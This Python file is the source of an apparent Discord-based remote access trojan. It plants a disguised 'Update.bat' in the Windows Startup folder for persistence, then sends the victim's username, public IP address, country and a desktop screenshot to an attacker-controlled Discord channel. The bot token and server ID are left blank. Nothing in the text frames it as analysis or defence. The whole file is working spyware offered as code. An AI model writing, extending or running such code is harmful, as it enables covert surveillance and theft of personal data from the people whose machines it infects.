import os
import discord
import subprocess
import requests
import pyautogui
import ctypes
import sys
from dotenv import load_dotenv
load_dotenv()
login = os.getlogin()
client = discord.Client(intents=discord.Intents.all())
session_id = os.urandom(8).hex()
guild_id = ""


def startup(file_path=""):
    temp = os.getenv("TEMP")
    bat_path = r'C:\\Users\\%s\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % login
    if file_path == "":
        file_path = sys.argv[0]
    with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)


@client.event
async def on_ready():
    guild = client.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip_address = requests.get("https://ipapi.co/json/").json()
    data = ip_address['country_name'], ip_address['ip']
    embed = discord.Embed(title="New session created",
                          description="", color=0xfafafa)
    embed.add_field(name="Session ID",
                    value=f"```{session_id}```", inline=True)
    embed.add_field(name="Username",
                    value=f"```{os.getlogin()}```", inline=True)
    embed.add_field(name="IP Address", value=f"```{data}```", inline=True)

    await channel.send(embed=embed)

    screenshot = pyautogui.screenshot()
    path = os.path.join(os.getenv("TEMP"), "screenshot.png")
    screenshot.save(path)
    file = discord.File(path)
    embeda = discord.Embed(title="Screenshot", color=0xfafafa)
    embeda.set_image(url="attachment://screenshot.png")
    await channel.send(embed=embeda, file=file)

client.run(
    '')
